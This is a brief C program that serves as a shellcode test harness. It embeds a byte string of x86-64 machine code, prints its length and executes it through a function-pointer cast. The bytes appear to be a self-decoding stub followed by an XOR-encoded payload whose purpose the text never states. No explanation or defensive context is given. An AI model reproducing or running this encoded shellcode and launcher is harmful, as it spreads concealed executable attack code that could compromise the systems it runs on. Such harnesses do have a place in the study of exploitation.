#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x18\x5f\x48\x31\xc9\x48\x83\xc1\x3d\x30\xdb\x80\x07\xa3\x30\x1f\x8a\x1f\x48\xff\xc7\xe2\xf4\xeb\x05\xe8\xe3\xff\xff\xff\xa5\xd6\x4e\xed\x75\x50\xf1\xaa\x68\x64\x9e\x5d\xb9\x78\x98\x78\x1e\xcb\x14\x75\x1e\xc8\x12\x7c\x1e\xcc\x0b\x28\xa0\x58\x91\x67";
main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	

